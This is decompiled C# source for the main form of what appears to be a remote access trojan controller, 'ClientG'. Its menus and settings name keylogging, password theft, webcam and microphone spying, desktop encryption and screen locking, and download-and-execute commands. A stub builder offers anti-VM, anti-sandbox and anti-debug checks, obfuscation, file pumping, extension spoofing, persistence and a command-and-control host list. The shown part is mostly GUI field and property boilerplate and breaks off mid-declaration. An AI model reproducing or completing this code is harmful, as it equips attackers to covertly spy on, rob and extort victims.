using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.IconLib;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ClientG;

[DesignerGenerated]
public class FrmMAINGR : Form
{
	public delegate void _data(int sock, byte[] b);

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("EtherealTabControl1")]
	private EtherealTabControl _EtherealTabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("EtherealTabControl2")]
	private EtherealTabControl _EtherealTabControl2;

	[AccessedThroughProperty("TabPage4")]
	private TabPage _TabPage4;

	[AccessedThroughProperty("listV1")]
	private ListView _listV1;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("ColumnHeader4")]
	private ColumnHeader _ColumnHeader4;

	[AccessedThroughProperty("ColumnHeader5")]
	private ColumnHeader _ColumnHeader5;

	[AccessedThroughProperty("ColumnHeader6")]
	private ColumnHeader _ColumnHeader6;

	[AccessedThroughProperty("ColumnHeader7")]
	private ColumnHeader _ColumnHeader7;

	[AccessedThroughProperty("ColumnHeader8")]
	private ColumnHeader _ColumnHeader8;

	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader _ColumnHeader9;

	[AccessedThroughProperty("ColumnHeader10")]
	private ColumnHeader _ColumnHeader10;

	[AccessedThroughProperty("ColumnHeader11")]
	private ColumnHeader _ColumnHeader11;

	[AccessedThroughProperty("ColumnHeader12")]
	private ColumnHeader _ColumnHeader12;

	[AccessedThroughProperty("ColumnHeader13")]
	private ColumnHeader _ColumnHeader13;

	[AccessedThroughProperty("TabPage5")]
	private TabPage _TabPage5;

	[AccessedThroughProperty("TabPage6")]
	private TabPage _TabPage6;

	[AccessedThroughProperty("TabPage7")]
	private TabPage _TabPage7;

	[AccessedThroughProperty("ClientMenu")]
	private ContextMenuStrip _ClientMenu;

	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[AccessedThroughProperty("RemoteDesktopToolStripMenuItem1")]
	private ToolStripMenuItem _RemoteDesktopToolStripMenuItem1;

	[AccessedThroughProperty("FileManagerToolStripMenuItem")]
	private ToolStripMenuItem _FileManagerToolStripMenuItem;

	[AccessedThroughProperty("ProcessManagerToolStripMenuItem1")]
	private ToolStripMenuItem _ProcessManagerToolStripMenuItem1;

	[AccessedThroughProperty("RemoteWebcamToolStripMenuItem")]
	private ToolStripMenuItem _RemoteWebcamToolStripMenuItem;

	[AccessedThroughProperty("MicrophoneToolStripMenuItem")]
	private ToolStripMenuItem _MicrophoneToolStripMenuItem;

	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[AccessedThroughProperty("SystemInformationToolStripMenuItem")]
	private ToolStripMenuItem _SystemInformationToolStripMenuItem;

	[AccessedThroughProperty("PasswordRecoveryToolStripMenuItem")]
	private ToolStripMenuItem _PasswordRecoveryToolStripMenuItem;

	[AccessedThroughProperty("PasstimeToolStripMenuItem")]
	private ToolStripMenuItem _PasstimeToolStripMenuItem;

	[AccessedThroughProperty("IPTrackerToolStripMenuItem")]
	private ToolStripMenuItem _IPTrackerToolStripMenuItem;

	[AccessedThroughProperty("ChatToolStripMenuItem")]
	private ToolStripMenuItem _ChatToolStripMenuItem;

	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[AccessedThroughProperty("FromLinkToolStripMenuItem")]
	private ToolStripMenuItem _FromLinkToolStripMenuItem;

	[AccessedThroughProperty("FromDiskToolStripMenuItem")]
	private ToolStripMenuItem _FromDiskToolStripMenuItem;

	[AccessedThroughProperty("FromScriptToolStripMenuItem")]
	private ToolStripMenuItem _FromScriptToolStripMenuItem;

	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[AccessedThroughProperty("UpdateToolStripMenuItem")]
	private ToolStripMenuItem _UpdateToolStripMenuItem;

	[AccessedThroughProperty("FromLinkToolStripMenuItem1")]
	private ToolStripMenuItem _FromLinkToolStripMenuItem1;

	[AccessedThroughProperty("FromDiskToolStripMenuItem1")]
	private ToolStripMenuItem _FromDiskToolStripMenuItem1;

	[AccessedThroughProperty("CloseToolStripMenuItem")]
	private ToolStripMenuItem _CloseToolStripMenuItem;

	[AccessedThroughProperty("UnistallToolStripMenuItem")]
	private ToolStripMenuItem _UnistallToolStripMenuItem;

	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[AccessedThroughProperty("RestartToolStripMenuItem")]
	private ToolStripMenuItem _RestartToolStripMenuItem;

	[AccessedThroughProperty("DiconnectToolStripMenuItem")]
	private ToolStripMenuItem _DiconnectToolStripMenuItem;

	[AccessedThroughProperty("ImageList2")]
	private ImageList _ImageList2;

	[AccessedThroughProperty("ToolStripSeparator1")]
	private ToolStripSeparator _ToolStripSeparator1;

	[AccessedThroughProperty("KeyloggerToolStripMenuItem1")]
	private ToolStripMenuItem _KeyloggerToolStripMenuItem1;

	[AccessedThroughProperty("PingToolStripMenuItem")]
	private ToolStripMenuItem _PingToolStripMenuItem;

	[AccessedThroughProperty("ToolStripSeparator2")]
	private ToolStripSeparator _ToolStripSeparator2;

	[AccessedThroughProperty("ToolStripSeparator3")]
	private ToolStripSeparator _ToolStripSeparator3;

	[AccessedThroughProperty("SelectToolStripMenuItem")]
	private ToolStripMenuItem _SelectToolStripMenuItem;

	[AccessedThroughProperty("SelectAllToolStripMenuItem")]
	private ToolStripMenuItem _SelectAllToolStripMenuItem;

	[AccessedThroughProperty("UnsellectToolStripMenuItem")]
	private ToolStripMenuItem _UnsellectToolStripMenuItem;

	[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
	private ToolStripMenuItem _OpenFolderToolStripMenuItem;

	[AccessedThroughProperty("TorrentSeederToolStripMenuItem")]
	private ToolStripMenuItem _TorrentSeederToolStripMenuItem;

	[AccessedThroughProperty("ToolStripSeparator4")]
	private ToolStripSeparator _ToolStripSeparator4;

	[AccessedThroughProperty("TabPage8")]
	private TabPage _TabPage8;

	[AccessedThroughProperty("Logs")]
	private ListView _Logs;

	[AccessedThroughProperty("ColumnHeader16")]
	private ColumnHeader _ColumnHeader16;

	[AccessedThroughProperty("ColumnHeader17")]
	private ColumnHeader _ColumnHeader17;

	[AccessedThroughProperty("TabPage9")]
	private TabPage _TabPage9;

	[AccessedThroughProperty("BlockedIP")]
	private ListView _BlockedIP;

	[AccessedThroughProperty("ColumnHeader18")]
	private ColumnHeader _ColumnHeader18;

	[AccessedThroughProperty("ColumnHeader19")]
	private ColumnHeader _ColumnHeader19;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ContextMenuStrip2")]
	private ContextMenuStrip _ContextMenuStrip2;

	[AccessedThroughProperty("AddToolStripMenuItem")]
	private ToolStripMenuItem _AddToolStripMenuItem;

	[AccessedThroughProperty("RemoveToolStripMenuItem")]
	private ToolStripMenuItem _RemoveToolStripMenuItem;

	[AccessedThroughProperty("ClearListToolStripMenuItem")]
	private ToolStripMenuItem _ClearListToolStripMenuItem;

	[AccessedThroughProperty("Commandslistview")]
	private ListView _Commandslistview;

	[AccessedThroughProperty("ColumnHeader20")]
	private ColumnHeader _ColumnHeader20;

	[AccessedThroughProperty("ColumnHeader21")]
	private ColumnHeader _ColumnHeader21;

	[AccessedThroughProperty("ColumnHeader22")]
	private ColumnHeader _ColumnHeader22;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Commanddata")]
	private TextBox _Commanddata;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Comands")]
	private ComboBox _Comands;

	[AccessedThroughProperty("ContextMenuStrip3")]
	private ContextMenuStrip _ContextMenuStrip3;

	[AccessedThroughProperty("RemoveCommandToolStripMenuItem")]
	private ToolStripMenuItem _RemoveCommandToolStripMenuItem;

	[AccessedThroughProperty("AddCommand")]
	private Button _AddCommand;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("BlockToolStripMenuItem")]
	private ToolStripMenuItem _BlockToolStripMenuItem;

	[AccessedThroughProperty("ToolStripSeparator5")]
	private ToolStripSeparator _ToolStripSeparator5;

	[AccessedThroughProperty("ToolStripSeparator6")]
	private ToolStripSeparator _ToolStripSeparator6;

	[AccessedThroughProperty("ToolStripSeparator7")]
	private ToolStripSeparator _ToolStripSeparator7;

	[AccessedThroughProperty("TabPage11")]
	private TabPage _TabPage11;

	[AccessedThroughProperty("TreeView1")]
	private TreeView _TreeView1;

	[AccessedThroughProperty("REF")]
	private Button _REF;

	[AccessedThroughProperty("StatusStrip2")]
	private StatusStrip _StatusStrip2;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage12")]
	private TabPage _TabPage12;

	[AccessedThroughProperty("TabPage13")]
	private TabPage _TabPage13;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("StatusStrip3")]
	private StatusStrip _StatusStrip3;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("blacklistlabel")]
	private ToolStripStatusLabel _blacklistlabel;

	[AccessedThroughProperty("StatusStrip4")]
	private StatusStrip _StatusStrip4;

	[AccessedThroughProperty("clientslabel")]
	private ToolStripStatusLabel _clientslabel;

	[AccessedThroughProperty("StatusStrip5")]
	private StatusStrip _StatusStrip5;

	[AccessedThroughProperty("clientsloglabel")]
	private ToolStripStatusLabel _clientsloglabel;

	[AccessedThroughProperty("ImageList3")]
	private ImageList _ImageList3;

	[AccessedThroughProperty("PM")]
	private PictureBox _PM;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("RFM")]
	private Button _RFM;

	[AccessedThroughProperty("REFM")]
	private Button _REFM;

	[AccessedThroughProperty("InstallInformationToolStripMenuItem")]
	private ToolStripMenuItem _InstallInformationToolStripMenuItem;

	[AccessedThroughProperty("ToolStripSeparator8")]
	private ToolStripSeparator _ToolStripSeparator8;

	[AccessedThroughProperty("REFF")]
	private Button _REFF;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("GroupBox9")]
	private GroupBox _GroupBox9;

	[AccessedThroughProperty("GroupBox15")]
	private GroupBox _GroupBox15;

	[AccessedThroughProperty("Label29")]
	private Label _Label29;

	[AccessedThroughProperty("Label28")]
	private Label _Label28;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("MSGPic")]
	private PictureBox _MSGPic;

	[AccessedThroughProperty("MSGPRI")]
	private Button _MSGPRI;

	[AccessedThroughProperty("MSGBUTTON")]
	private ComboBox _MSGBUTTON;

	[AccessedThroughProperty("MSGICON")]
	private ComboBox _MSGICON;

	[AccessedThroughProperty("MSGB")]
	private TextBox _MSGB;

	[AccessedThroughProperty("MSGT")]
	private TextBox _MSGT;

	[AccessedThroughProperty("CBMSG")]
	private CheckBox _CBMSG;

	[AccessedThroughProperty("GroupBox10")]
	private GroupBox _GroupBox10;

	[AccessedThroughProperty("TabControl2")]
	private TabControl _TabControl2;

	[AccessedThroughProperty("TabPage17")]
	private TabPage _TabPage17;

	[AccessedThroughProperty("CBdrop")]
	private CheckBox _CBdrop;

	[AccessedThroughProperty("GroupBox11")]
	private GroupBox _GroupBox11;

	[AccessedThroughProperty("Label19")]
	private Label _Label19;

	[AccessedThroughProperty("CDP")]
	private ComboBox _CDP;

	[AccessedThroughProperty("Label18")]
	private Label _Label18;

	[AccessedThroughProperty("TBDN")]
	private TextBox _TBDN;

	[AccessedThroughProperty("TabPage14")]
	private TabPage _TabPage14;

	[AccessedThroughProperty("TBVBS")]
	private TextBox _TBVBS;

	[AccessedThroughProperty("CBVBS")]
	private CheckBox _CBVBS;

	[AccessedThroughProperty("TBJS")]
	private TextBox _TBJS;

	[AccessedThroughProperty("CBJS")]
	private CheckBox _CBJS;

	[AccessedThroughProperty("TBURL")]
	private TextBox _TBURL;

	[AccessedThroughProperty("CBURL")]
	private CheckBox _CBURL;

	[AccessedThroughProperty("TBSEXE")]
	private TextBox _TBSEXE;

	[AccessedThroughProperty("CBSEXE")]
	private CheckBox _CBSEXE;

	[AccessedThroughProperty("TabPage15")]
	private TabPage _TabPage15;

	[AccessedThroughProperty("CBREG")]
	private CheckBox _CBREG;

	[AccessedThroughProperty("GroupBox12")]
	private GroupBox _GroupBox12;

	[AccessedThroughProperty("TBRK")]
	private TextBox _TBRK;

	[AccessedThroughProperty("Label20")]
	private Label _Label20;

	[AccessedThroughProperty("Label21")]
	private Label _Label21;

	[AccessedThroughProperty("TBRV")]
	private TextBox _TBRV;

	[AccessedThroughProperty("TabPage16")]
	private TabPage _TabPage16;

	[AccessedThroughProperty("CBST")]
	private CheckBox _CBST;

	[AccessedThroughProperty("GroupBox13")]
	private GroupBox _GroupBox13;

	[AccessedThroughProperty("Label25")]
	private Label _Label25;

	[AccessedThroughProperty("TBSTT")]
	private NumericUpDown _TBSTT;

	[AccessedThroughProperty("Label22")]
	private Label _Label22;

	[AccessedThroughProperty("Label23")]
	private Label _Label23;

	[AccessedThroughProperty("TBSTN")]
	private TextBox _TBSTN;

	[AccessedThroughProperty("GroupBox2")]
	private GroupBox _GroupBox2;

	[AccessedThroughProperty("Button7")]
	private Button _Button7;

	[AccessedThroughProperty("Button6")]
	private Button _Button6;

	[AccessedThroughProperty("Button4")]
	private Button _Button4;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("GroupBox16")]
	private GroupBox _GroupBox16;

	[AccessedThroughProperty("pumpcb")]
	private ComboBox _pumpcb;

	[AccessedThroughProperty("Pumpv")]
	private NumericUpDown _Pumpv;

	[AccessedThroughProperty("pumpch")]
	private CheckBox _pumpch;

	[AccessedThroughProperty("CBPRESS")]
	private CheckBox _CBPRESS;

	[AccessedThroughProperty("CSPOOFER")]
	private ComboBox _CSPOOFER;

	[AccessedThroughProperty("CBSPOOF")]
	private CheckBox _CBSPOOF;

	[AccessedThroughProperty("GroupBox5")]
	private GroupBox _GroupBox5;

	[AccessedThroughProperty("RDicon")]
	private RadioButton _RDicon;

	[AccessedThroughProperty("RBnoicon")]
	private RadioButton _RBnoicon;

	[AccessedThroughProperty("addicon")]
	private Button _addicon;

	[AccessedThroughProperty("iconbox")]
	private PictureBox _iconbox;

	[AccessedThroughProperty("GroupBox7")]
	private GroupBox _GroupBox7;

	[AccessedThroughProperty("GroupBox3")]
	private GroupBox _GroupBox3;

	[AccessedThroughProperty("Button5")]
	private Button _Button5;

	[AccessedThroughProperty("ass8")]
	private TextBox _ass8;

	[AccessedThroughProperty("ass7")]
	private TextBox _ass7;

	[AccessedThroughProperty("ass6")]
	private TextBox _ass6;

	[AccessedThroughProperty("ass5")]
	private TextBox _ass5;

	[AccessedThroughProperty("ass4")]
	private TextBox _ass4;

	[AccessedThroughProperty("ass3")]
	private TextBox _ass3;

	[AccessedThroughProperty("ass2")]
	private TextBox _ass2;

	[AccessedThroughProperty("ass1")]
	private TextBox _ass1;

	[AccessedThroughProperty("Label17")]
	private Label _Label17;

	[AccessedThroughProperty("Label16")]
	private Label _Label16;

	[AccessedThroughProperty("Label15")]
	private Label _Label15;

	[AccessedThroughProperty("Label14")]
	private Label _Label14;

	[AccessedThroughProperty("Label13")]
	private Label _Label13;

	[AccessedThroughProperty("Label12")]
	private Label _Label12;

	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("CBass")]
	private CheckBox _CBass;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("GroupBox14")]
	private GroupBox _GroupBox14;

	[AccessedThroughProperty("Label24")]
	private Label _Label24;

	[AccessedThroughProperty("SBSLEEP")]
	private CheckBox _SBSLEEP;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("sleep")]
	private NumericUpDown _sleep;

	[AccessedThroughProperty("Label26")]
	private Label _Label26;

	[AccessedThroughProperty("Label27")]
	private Label _Label27;

	[AccessedThroughProperty("recdelay")]
	private NumericUpDown _recdelay;

	[AccessedThroughProperty("GroupBox8")]
	private GroupBox _GroupBox8;

	[AccessedThroughProperty("ATAM")]
	private CheckBox _ATAM;

	[AccessedThroughProperty("OPT")]
	private CheckBox _OPT;

	[AccessedThroughProperty("STEN")]
	private CheckBox _STEN;

	[AccessedThroughProperty("CBRAND")]
	private CheckBox _CBRAND;

	[AccessedThroughProperty("Obfu")]
	private CheckBox _Obfu;

	[AccessedThroughProperty("ANIL")]
	private CheckBox _ANIL;

	[AccessedThroughProperty("CBPROPRIO")]
	private ComboBox _CBPROPRIO;

	[AccessedThroughProperty("CBHIDEE")]
	private CheckBox _CBHIDEE;

	[AccessedThroughProperty("CBPROPRI")]
	private CheckBox _CBPROPRI;

	[AccessedThroughProperty("ANTIE")]
	private CheckBox _ANTIE;

	[AccessedThroughProperty("ANTID")]
	private CheckBox _ANTID;

	[AccessedThroughProperty("ANTIW")]
	private CheckBox _ANTIW;

	[AccessedThroughProperty("ANTISB")]
	private CheckBox _ANTISB;

	[AccessedThroughProperty("ANTIVM")]
	private CheckBox _ANTIVM;

	[AccessedThroughProperty("GroupBox4")]
	private GroupBox _GroupBox4;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	[AccessedThroughProperty("clientidtextbox")]
	private TextBox _clientidtextbox;

	[AccessedThroughProperty("mutextxtbox")]
	private TextBox _mutextxtbox;

	[AccessedThroughProperty("GroupBox6")]
	private GroupBox _GroupBox6;

	[AccessedThroughProperty("hostsports")]
	private ListView _hostsports;

	[AccessedThroughProperty("ColumnHeader14")]
	private ColumnHeader _ColumnHeader14;

	[AccessedThroughProperty("ColumnHeader15")]
	private ColumnHeader _ColumnHeader15;

	[AccessedThroughProperty("Addhosts")]
	private Button _Addhosts;

	[AccessedThroughProperty("Porttxtbox")]
	private NumericUpDown _Porttxtbox;

	[AccessedThroughProperty("hosttxtbox")]
	private TextBox _hosttxtbox;

	[AccessedThroughProperty("ContextMenuStrip4")]
	private ContextMenuStrip _ContextMenuStrip4;

	[AccessedThroughProperty("AddToolStripMenuItem1")]
	private ToolStripMenuItem _AddToolStripMenuItem1;

	[AccessedThroughProperty("EditToolStripMenuItem")]
	private ToolStripMenuItem _EditToolStripMenuItem;

	[AccessedThroughProperty("RemoveToolStripMenuItem1")]
	private ToolStripMenuItem _RemoveToolStripMenuItem1;

	[AccessedThroughProperty("ClearListToolStripMenuItem1")]
	private ToolStripMenuItem _ClearListToolStripMenuItem1;

	[AccessedThroughProperty("EncryptToolStripMenuItem")]
	private ToolStripMenuItem _EncryptToolStripMenuItem;

	[AccessedThroughProperty("EncryptDESKTOPToolStripMenuItem")]
	private ToolStripMenuItem _EncryptDESKTOPToolStripMenuItem;

	[AccessedThroughProperty("DecryptDESKTOPToolStripMenuItem")]
	private ToolStripMenuItem _DecryptDESKTOPToolStripMenuItem;

	[AccessedThroughProperty("LockScreenToolStripMenuItem")]
	private ToolStripMenuItem _LockScreenToolStripMenuItem;

	[AccessedThroughProperty("LockToolStripMenuItem")]
	private ToolStripMenuItem _LockToolStripMenuItem;

	[AccessedThroughProperty("UnlockToolStripMenuItem")]
	private ToolStripMenuItem _UnlockToolStripMenuItem;

	[AccessedThroughProperty("FunToolStripMenuItem")]
	private ToolStripMenuItem _FunToolStripMenuItem;

	[AccessedThroughProperty("StartInfinityMessagesToolStripMenuItem")]
	private ToolStripMenuItem _StartInfinityMessagesToolStripMenuItem;

	[AccessedThroughProperty("StopInfinityMessagesToolStripMenuItem")]
	private ToolStripMenuItem _StopInfinityMessagesToolStripMenuItem;

	public XmlDocument Document;

	private ColumnHeader m_SortingColumn;

	private string text1;

	private string text2;

	public string URC;

	private string victim;

	public int reping;

	public string Key;

	public int sock;

	public int CPORT;

	[AccessedThroughProperty("s")]
	private SocketServer _s;

	public string a;

	public string b;

	public string o;

	public string FileToSave;

	public List<string> PL;

	public GetcountryGR GeoIP;

	private string culture;

	private string country;

	public int Afghanistan;

	public int Albania;

	public int Algeria;

	public int AmericanSamoa;

	public int Andorra;

	public int Angola;

	public int Anguilla;

	public int AntiguaandBarbuda;

	public int Argentina;

	public int Armenia;

	public int Aruba;

	public int Australia;

	public int Austria;

	public int Azerbaijan;

	public int Bahamas;

	public int Bahrain;

	public int Bangladesh;

	public int Barbados;

	public int Belarus;

	public int Belgium;

	public int Belize;

	public int Benin;

	public int Bermuda;

	public int Bhutan;

	public int Bolivia;

	public int BosniaandHerzegovina;

	public int Botswana;

	public int BouvetIsland;

	public int Brazil;

	public int BritishIndianOceanTerritory;

	public int BritishVirginIsland;

	public int BruneiDarussalam;

	public int Bulgaria;

	public int BurkinaFaso;

	public int Burundi;

	public int Cambodia;

	public int Cameroon;

	public int Canada;

	public int CVC;

	public int Catalonia;

	public int CaymanIslands;

	public int CentralAfricanRepublic;

	public int Chad;

	public int Chile;

	public int China;

	public int ChristmasIsland;

	public int CCKI;

	public int Colombia;

	public int Comoros;

	public int DemocraticRepublicoftheCongo;

	public int CostaRica;

	public int Croatia;

	public int Cuba;

	public int Cyprus;

	public int CzechRepublic;

	public int Denmark;

	public int Djibouti;

	public int Dominica;

	public int DominicanRepublic;

	public int Ecuador;

	public int Egypt;

	public int ElSalvador;

	public int England;

	public int EquatorialGuinea;

	public int Eritrea;

	public int Estonia;

	public int Ethiopia;

	public int Europe;

	public int FalklandIslandsMalvinas;

	public int FaroeIslands;

	public int Fiji;

	public int Finland;

	public int France;

	public int FrenchGuiana;

	public int FrenchPolynesia;

	public int FrenchSouthernTerritories;

	public int Gabon;

	public int Gambia;

	public int Georgia;

	public int Germany;

	public int Ghana;

	public int Gibraltar;

	public int Greece;

	public int Greenland;

	public int Grenada;

	public int Guadeloupe;

	public int Guam;

	public int Guatemala;

	public int Guinea;

	public int GuineaBissau;

	public int Guyana;

	public int Haiti;

	public int HeardIslandandMcDonaldIslands;

	public int Honduras;

	public int HongKong;

	public int Hungary;

	public int Iceland;

	public int India;

	public int Indonesia;

	public int IslamicRepublicofIran;

	public int Iraq;

	public int Ireland;

	public int PalestinianTerritory;

	public int Italy;

	public int Jamaica;

	public int Japan;

	public int Jordan;

	public int Kazakhstan;

	public int Kenya;

	public int Kiribati;

	public int NorthKorea;

	public int SouthKorea;

	public int Kuwait;

	public int Kyrgyzstan;

	public int LaoPeoplesDemocraticRepublic;

	public int Latvia;

	public int Lebanon;

	public int Lesotho;

	public int Liberia;

	public int Libya;

	public int Liechtenstein;

	public int Lithuania;

	public int Luxembourg;

	public int Macao;

	public int RepublicofMacedonia;

	public int Madagascar;

	public int Malawi;

	public int Malaysia;

	public int Maldives;

	public int Mali;

	public int Malta;

	public int MarshallIslands;

	public int Martinique;

	public int Mauritania;

	public int Mauritius;

	public int Mayotte;

	public int Mexico;

	public int FederatedStatesofMicronesia;

	public int RepublicofMoldova;

	public int PrincipalityofMonaco;

	public int Mongolia;

	public int Montenegro;

	public int Montserrat;

	public int Morocco;

	public int Mozambique;

	public int Myanmar;

	public int Namibia;

	public int Nauru;

	public int Nepal;

	public int NetherlandsAntilles;

	public int Netherlands;

	public int NewCaledonia;

	public int NewZealand;

	public int Nicaragua;

	public int Niger;

	public int Nigeria;

	public int Niue;

	public int NorfolkIsland;

	public int NorthernMarianaIslands;

	public int Norway;

	public int SultanateofOman;

	public int IslamicRepublicofPakistan;

	public int Palau;

	public int Panama;

	public int PapuaNewGuinea;

	public int Paraguay;

	public int Peru;

	public int Philippines;

	public int PitcairnIslands;

	public int Poland;

	public int Portugal;

	public int Palestine;

	public int PuertoRico;

	public int Qatar;

	public int Reunion;

	public int Romania;

	public int Serbia;

	public int Russia;

	public int Rwanda;

	public int SaintHelena;

	public int SaintKittsandNevis;

	public int SaintLucia;

	public int SaintPierreandMiquelon;

	public int SaintVincentandtheGrenadines;

	public int Samoa;

	public int SanMarino;

	public int SaoTomeandPrincipe;

	public int SaudiArabia;

	public int Scotland;

	public int Senegal;

	public int Seychelles;

	public int SierraLeone;

	public int Singapore;

	public int Slovakia;

	public int Slovenia;

	public int SolomonIslands;

	public int Somalia;

	public int SouthAfrica;

	public int SouthGeorgiaandtheSouthSandwichIslands;

	public int Spain;

	public int SriLanka;

	public int Sudan;

	public int Suriname;

	public int SvalbardandJanMayen;

	public int Swaziland;

	public int Sweden;

	public int Switzerland;

	public int Syria;

	public int Taiwan;

	public int Tajikistan;

	public int UnitedRepublicofTanzania;

	public int Thailand;

	public int Togo;

	public int Tokelau;

	public int Tonga;

	public int TrinidadAndTobago;

	public int Tunisia;

	public int Turkey;

	public int Turkmenistan;

	public int TurksandCaicosIslands;

	public int Tuvalu;

	public int Uganda;

	public int Ukraine;

	public int UnitedArabEmirates;

	public int UnitedKingdom;

	public int UnitedStatesMinorOutlyingIslands;

	public int UnitedStates;

	public int Uruguay;

	public int Uzbekistan;

	public int Wales;

	public int WallisAndFutuna;

	public int Vanuatu;

	public int VaticanCityState;

	public int Venezuela;

	public int WesternSahara;

	public int Vietnam;

	public int UnitedStatesVirginIslands;

	public int Yemen;

	public int Zambia;

	public int Zimbabwe;

	public int CookIslands;

	public int Antarctica;

	public int Congo;

	public int CoteDIvoire;

	public int SatelliteProvider;

	public int AlandIslands;

	public int Guernsey;

	public int IsleofMan;

	public int Jersey;

	public int SaintBarthelemy;

	public int NA;

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual EtherealTabControl EtherealTabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _EtherealTabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EtherealTabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual EtherealTabControl EtherealTabControl2
	{
		[DebuggerNonUserCode]
		get
		{
			return _EtherealTabControl2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EtherealTabControl2 = value;
		}
	}

	internal virtual TabPage TabPage4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage4 = value;
		}
	}

	internal virtual ListView listV1
	{
		[DebuggerNonUserCode]
		get
		{
			return _listV1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			EventHandler eventHandler = listV1_SelectedIndexChanged;
			ColumnClickEventHandler val = new ColumnClickEventHandler(l1_ColumnClick);
			if (_listV1 != null)
			{
				_listV1.remove_SelectedIndexChanged(eventHandler);
				_listV1.remove_ColumnClick(val);
			}
			_listV1 = value;
			if (_listV1 != null)
			{
				_listV1.add_SelectedIndexChanged(eventHandler);
				_listV1.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
